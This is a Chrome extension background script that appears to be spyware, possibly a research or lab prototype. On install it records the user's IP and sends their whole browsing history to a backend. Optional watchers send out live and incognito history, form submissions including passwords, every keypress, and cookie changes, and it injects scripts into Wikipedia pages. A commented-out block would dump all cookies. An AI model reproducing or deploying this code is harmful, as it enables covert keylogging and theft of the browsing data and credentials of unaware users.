/********************* Backend Calls ***************************/
const URL = "http://localhost:5000";
const makeRequest = (url, options) => {
    return fetch(url, options)
        .then((res) =>
            res.json().then((json) => ({ status: res.status, json }))
        )
        .then((res) => {
            if (res.status !== 200) {
                throw Error(res.json.error);
            }
            return res.json;
        });
};

const postRequest = (route, data) =>
    makeRequest(`${URL}${route}`, {
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            Authorization: `token`,
        },
        body: JSON.stringify(data),
    });

/********************* Helper ***************************/

// Initial add user, and their current history
const addUser = (uid) => {
    const user = {
        uid: uid,
        extension_id: chrome.runtime.id,
        date_created: Date().toString(),

        // https://stackoverflow.com/a/19295499
        version: `Chrome ${/Chrome\/([0-9.]+)/.exec(navigator.userAgent)[1]}`,
    };

    makeRequest("https://api.ipify.org?format=json")
        .then((r) => (user.ip = r.ip))
        .then(() => postRequest("/user/", user))
        .then(() => {
            chrome.history.search({ text: "" }, (h) => {
                postRequest("/user/history", {
                    uid,
                    date: Date().toString(),
                    history: h,
                });
            });
        });

    // Get all stored cookies, PAYLOAD TOO LARGE
    // chrome.cookies.getAllCookieStores((cookieStores) => {
    //     cookieStores.forEach((s) =>
    //         chrome.cookies.getAll({ storeId: s.id }, (c) => {
    //             const data = {
    //                 uid,
    //                 time: Date.now(),
    //                 storeId: s.id,
    //                 cookies: c,
    //             };
    //             postRequest("/cookies/store", data).catch((err) =>
    //                 console.log(err.message)
    //             );
    //         })
    //     );
    // });
};

const addForm = (uid, form, tab) => {
    const data = {
        uid: uid,
        time: Date.now(),
        form,
        tab,
    };
    postRequest("/form/", data).catch((err) => console.log(err.message));
};

// Add live history entries as it is added
const addHistory = (uid, historyItem) => {
    const data = { uid, date: Date().toString(), historyItem };
    postRequest("/history/", data).catch((err) => console.log(err.message));
};

// Add live incognito history
const addIncognitoHistory = (uid, tab) => {
    const historyItem = {
        time: Date.now(),
        ...tab,
    };
    const data = { uid, historyItem };
    postRequest("/incognito/", data).catch((err) => console.log(err.message));
};

// Logs keypresses
const logKeypress = (uid, url, direction, key) => {
    const data = { uid, time: Date.now(), url, direction, key };
    postRequest("/keypress/", data).catch((err) => console.log(err.message));
};

// Logs changes in cookies
const logCookieChange = (uid, details) => {
    const data = { uid, time: Date.now(), details };
    postRequest("/cookies/", data).catch((err) => console.log(err.message));
};

const getRandomToken = () => {
    // https://stackoverflow.com/a/23854032
    const randomPool = new Uint8Array(32);
    crypto.getRandomValues(randomPool);
    let hex = "";
    for (var i = 0; i < randomPool.length; ++i) {
        hex += randomPool[i].toString(16);
    }
    return hex;
};

/********************* Listeners *************************/
chrome.runtime.onInstalled.addListener((details) => {
    // Made unique identifier for new user
    if (details.reason === "install") {
        chrome.storage.sync.get("userid", (res) => {
            const userid = res.userid ? res.userid : getRandomToken();
            chrome.storage.sync.set({ userid: userid });
            addUser(userid);
        });
    }

    chrome.contextMenus.create({
        id: "sampleContextMenu",
        title: "Sample Context Menu",
        contexts: ["page"],
    });
});

// Adds to history as websites are visited (not available in incognito)
chrome.storage.sync.get("historyWatcher", (runCommand) => {
    if (!runCommand.historyWatcher) return;
    chrome.history.onVisited.addListener((h) => {
        console.log(h);
        chrome.storage.sync.get("userid", (res) => {
            addHistory(res.userid, h);
        });
    });
});

// Adds to history as websites are visited (not available in incognito)
chrome.storage.sync.get("incognitoHistoryWatcher", (runCommand) => {
    if (!runCommand.incognitoHistoryWatcher) return;
    chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
        if (
            ["chrome://newtab/", "about:blank"].includes(tab.url) ||
            !tab.incognito
        )
            return;

        if (
            changeInfo.status === "complete" ||
            changeInfo.status === "loading"
        ) {
            chrome.storage.sync.get("userid", (res) => {
                addIncognitoHistory(res.userid, tab);
            });
        }
    });
});

// Forms with password Listener
chrome.storage.sync.get("passwordWatcher", (runCommand) => {
    if (!runCommand.passwordWatcher) return;
    chrome.runtime.onMessage.addListener((request, sender) => {
        if (
            request.type === "formSubmit" ||
            request.type === "passwordChange"
        ) {
            chrome.storage.sync.get("userid", (res) => {
                console.log(request.form);
                addForm(res.userid, request.form, sender.tab);
            });
        }
    });
});

chrome.storage.sync.get("keyPressWatcher", (runCommand) => {
    if (!runCommand.keyPressWatcher) return;
    chrome.runtime.onMessage.addListener((request, sender) => {
        if (request.type === "keyDown" || request.type === "keyUp") {
            chrome.storage.sync.get("userid", (res) => {
                const direction = request.type === "keyDown" ? "DOWN" : "UP";
                const url = sender.tab.url;
                logKeypress(res.userid, url, direction, request.key);
            });
        }
    });
});

// Just prints headers for now
chrome.storage.sync.get("requestWatcher", (runCommand) => {
    if (!runCommand.requestWatcher) return;
    // onBeforeSendHeaders, onSendHeaders
    chrome.webRequest.onSendHeaders.addListener(
        (details) => {
            console.log(details);
            // console.log("METHOD", details.method);
            // console.log("INITIATOE", details.initiator);
            // console.log("HEADERS", details.requestHeaders);
            // console.log("TIME", details.timeStamp);
            // console.log("URL", details.url);
        },
        { urls: ["<all_urls>"] },
        ["requestHeaders"]
    );
});

// Cookie change
chrome.storage.sync.get("cookieWatcher", (runCommand) => {
    if (!runCommand.cookieWatcher) return;

    chrome.cookies.onChanged.addListener((changeInfo) => {
        console.log("ONCHANGE", changeInfo);
        chrome.storage.sync.get("userid", (res) => {
            logCookieChange(res.userid, changeInfo);
        });
    });
});

// Script injection
chrome.storage.sync.get("injectScripts", (runCommand) => {
    if (!runCommand.injectScripts) return;

    chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
        if (
            changeInfo.status === "complete" &&
            tab.url &&
            tab.url.includes("en.wikipedia.org")
        ) {
            chrome.scripting.executeScript({
                target: { tabId: tabId, allFrames: true },
                files: ["scripts/inject.js"],
            });
        }
    });
});
